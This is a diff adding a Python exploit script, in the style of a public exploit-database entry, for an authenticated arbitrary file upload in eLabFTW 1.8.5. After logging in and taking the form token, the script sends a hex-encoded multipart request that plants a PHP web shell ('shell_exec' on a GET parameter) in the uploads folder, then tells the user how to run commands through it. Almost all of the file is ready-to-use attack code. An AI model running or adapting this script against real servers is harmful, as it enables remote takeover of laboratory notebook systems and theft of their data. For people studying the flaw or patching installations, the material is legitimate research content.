@@ -1,0 +1,166 @@
+#!/usr/bin/env python
+#
+# Exploit Title         : eLabFTW 1.8.5 'EntityController' Arbitrary
+File Upload / RCE
+# Date                  : 5/18/19
+# Exploit Author        : liquidsky (JMcPeters)
+# Vulnerable Software   : eLabFTW 1.8.5
+# Vendor Homepage       : https://www.elabftw.net/
+# Version               : 1.8.5
+# Software Link         : https://github.com/elabftw/elabftw
+# Tested On             : Linux / PHP Version 7.0.33 / Default
+installation (Softaculous)
+# Author Site : http://incidentsecurity.com | https://github.com/fuzzlove
+#
+# Greetz : wetw0rk, offsec ^^
+#
+# Description: eLabFTW 1.8.5 is vulnerable to arbitrary file uploads
+via the /app/controllers/EntityController.php component.
+# This may result in remote command execution. An attacker can use a
+user account to fully compromise the system using a POST request.
+# This will allow for PHP files to be written to the web root, and for
+code to execute on the remote server.
+#
+# Notes: Once this is done a php shell will drop at https://[target
+site]/[elabftw directory]/uploads/[random 2 alphanum]/[random long
+alphanumeric].php5?e=whoami
+# You will have to visit the uploads directory on the site to see what
+the name is. However there is no protection against directory listing.
+# So this can be done by an attacker remotely.
+
+import requests
+from bs4 import BeautifulSoup as bs4
+requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+import sys
+import time
+
+print "+-------------------------------------------------------------+"
+print
+print "- eLabFTW 1.8.5 'EntityController' Arbitrary File Upload / RCE"
+print
+print "-          Discovery / PoC by liquidsky (JMcPeters) ^^"
+print
+print "+-------------------------------------------------------------+"
+
+try:
+
+target = sys.argv[1]
+email = sys.argv[2]
+password = sys.argv[3]
+directory = sys.argv[4]
+
+except IndexError:
+
+        print
+print "- Usage: %s <target> <email> <password> <directory>" % sys.argv[0]
+print "- Example: %s incidentsecurity.com user@email.com mypassword
+elabftw" % sys.argv[0]
+        print
+sys.exit()
+
+
+proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
+
+# The payload to send
+data = ""
+data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d"
+data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x37"
+data += "\x32\x31\x36\x37\x35\x39\x38\x31\x31\x30\x38\x37\x34\x35\x39"
+data += "\x34\x31\x31\x31\x36\x33\x30\x33\x39\x35\x30\x37\x37\x0d\x0a"
+data += "\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x44\x69\x73\x70\x6f\x73\x69"
+data += "\x74\x69\x6f\x6e\x3a\x20\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"
+data += "\x3b\x20\x6e\x61\x6d\x65\x3d\x22\x75\x70\x6c\x6f\x61\x64\x22"
+data += "\x0d\x0a\x0d\x0a\x74\x72\x75\x65\x0d\x0a\x2d\x2d\x2d\x2d\x2d"
+data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d"
+data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x37\x32\x31\x36\x37\x35"
+data += "\x39\x38\x31\x31\x30\x38\x37\x34\x35\x39\x34\x31\x31\x31\x36"
+data += "\x33\x30\x33\x39\x35\x30\x37\x37\x0d\x0a\x43\x6f\x6e\x74\x65"
+data += "\x6e\x74\x2d\x44\x69\x73\x70\x6f\x73\x69\x74\x69\x6f\x6e\x3a"
+data += "\x20\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61\x3b\x20\x6e\x61\x6d"
+data += "\x65\x3d\x22\x69\x64\x22\x0d\x0a\x0d\x0a\x34\x0d\x0a\x2d\x2d"
+data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d"
+data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x37\x32\x31"
+data += "\x36\x37\x35\x39\x38\x31\x31\x30\x38\x37\x34\x35\x39\x34\x31"
+data += "\x31\x31\x36\x33\x30\x33\x39\x35\x30\x37\x37\x0d\x0a\x43\x6f"
+data += "\x6e\x74\x65\x6e\x74\x2d\x44\x69\x73\x70\x6f\x73\x69\x74\x69"
+data += "\x6f\x6e\x3a\x20\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61\x3b\x20"
+data += "\x6e\x61\x6d\x65\x3d\x22\x74\x79\x70\x65\x22\x0d\x0a\x0d\x0a"
+data += "\x65\x78\x70\x65\x72\x69\x6d\x65\x6e\x74\x73\x0d\x0a\x2d\x2d"
+data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d"
+data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x37\x32\x31"
+data += "\x36\x37\x35\x39\x38\x31\x31\x30\x38\x37\x34\x35\x39\x34\x31"
+data += "\x31\x31\x36\x33\x30\x33\x39\x35\x30\x37\x37\x0d\x0a\x43\x6f"
+data += "\x6e\x74\x65\x6e\x74\x2d\x44\x69\x73\x70\x6f\x73\x69\x74\x69"
+data += "\x6f\x6e\x3a\x20\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61\x3b\x20"
+data += "\x6e\x61\x6d\x65\x3d\x22\x66\x69\x6c\x65\x22\x3b\x20\x66\x69"
+data += "\x6c\x65\x6e\x61\x6d\x65\x3d\x22\x70\x6f\x63\x33\x2e\x70\x68"
+data += "\x70\x35\x22\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79"
+data += "\x70\x65\x3a\x20\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e"
+data += "\x2f\x78\x2d\x70\x68\x70\x0d\x0a\x0d\x0a\x3c\x3f\x70\x68\x70"
+data += "\x20\x65\x63\x68\x6f\x20\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65"
+data += "\x63\x28\x24\x5f\x47\x45\x54\x5b\x27\x65\x27\x5d\x2e\x27\x20"
+data += "\x32\x3e\x26\x31\x27\x29\x3b\x20\x3f\x3e\x0d\x0a\x2d\x2d\x2d"
+data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d"
+data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x37\x32\x31\x36"
+data += "\x37\x35\x39\x38\x31\x31\x30\x38\x37\x34\x35\x39\x34\x31\x31"
+data += "\x31\x36\x33\x30\x33\x39\x35\x30\x37\x37\x2d\x2d\x0d\x0a"
+
+s = requests.Session()
+
+print "[*] Visiting eLabFTW Site"
+r = s.get('https://' + target + '/' + directory +
+'/login.php',verify=False, proxies=proxies)
+print "[x]"
+
+# Grabbing token
+html_bytes = r.text
+soup = bs4(html_bytes, 'lxml')
+token = soup.find('input', {'name':'formkey'})['value']
+
+values = {'email': email,
+          'password': password,
+          'formkey': token,}
+
+time.sleep(2)
+
+print "[*] Logging in to eLabFTW"
+
+r = s.post('https://' + target + '/' + directory +
+'/app/controllers/LoginController.php', data=values, verify=False,
+proxies=proxies)
+
+print "[x] Logged in :)"
+
+time.sleep(2)
+
+sessionId = s.cookies['PHPSESSID']
+
+headers = {
+    #POST /elabftw/app/controllers/EntityController.php HTTP/1.1
+    #Host: incidentsecurity.com
+    "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:52.0)
+Gecko/20100101 Firefox/52.0",
+    "Accept": "application/json",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate",
+    #Referer: https://incidentsecurity.com
+    "Cache-Control": "no-cache",
+    "X-Requested-With": "XMLHttpRequest",
+    "Content-Length": "588",
+    "Content-Type": "multipart/form-data;
+boundary=---------------------------72167598110874594111630395077",
+    "Connection": "close",
+    "Cookie": "PHPSESSID=" + sessionId + ";" + "token=" + token
+}
+
+print "[*] Sending payload..."
+r = s.post('https://' + target + '/' + directory +
+'/app/controllers/EntityController.php',verify=False, headers=headers,
+data=data, proxies=proxies)
+print "[x] Payload sent"
+print
+print "Now check https://%s/%s/uploads" % (target, directory)
+print "Your php shell will be there under a random name (.php5)"
+print
+print "i.e https://[vulnerable
+site]/elabftw/uploads/60/6054a32461de6294843b7f7ea9ea2a34a19ca420752b087c87011144fc83f90b9aa5bdcdce5dee132584f6da45b7ec9e3841405e9d67a7d196f064116cf2da38.php5?e=whoami"
